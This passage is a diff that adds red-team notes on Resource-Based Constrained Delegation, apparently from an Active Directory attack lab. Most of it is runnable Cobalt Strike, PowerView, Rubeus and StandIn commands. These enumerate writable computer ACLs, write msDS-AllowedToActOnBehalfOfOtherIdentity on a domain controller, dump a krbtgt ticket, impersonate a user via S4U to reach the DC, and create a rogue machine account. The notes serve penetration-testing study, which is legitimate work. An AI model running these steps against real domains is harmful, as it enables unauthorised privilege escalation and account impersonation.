@@ -100,3 +100,49 @@ steal_token <PID>
 
 **Resource-Based Constrained Delegation**
 
+This query will obtain every domain computer and read their ACL, filtering on the interesting rights
+- WriteProperty
+- GenericWrite
+- GenericAll
+- WriteDacl
+```
+powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+```
+
+The common way of obtaining a principal with an SPN is to use a computer account. Steps:
+1. get the SID
+2. use this inside an SDDL to create a security descriptor.  The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format.
+3. Now use Set-DomainObjects in a one liner in CS to execute
+4. use the computer account to perform a S4U impersonation with Rubeus
+5. then pass the ticket
+
+```
+powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
+$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
+$rsdb = New-Object byte[] ($rsd.BinaryLength)
+$rsd.GetBinaryForm($rsdb, 0)
+powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "<DC>" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+powershell Get-DomainComputer -Identity "<DC>" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
+steal_token <PID>
+```
+
+If you did not have local admin access to a computer already, you can resort to creating your own computer object
+Tools used: [StandIn](https://github.com/FuzzySecurity/StandIn)
+```
+CS:
+powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
+execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
+On Attacker machine:
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
+CS:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<aes key> /nowrap
+```
+
+**Shadow Credentials**
+
+
+
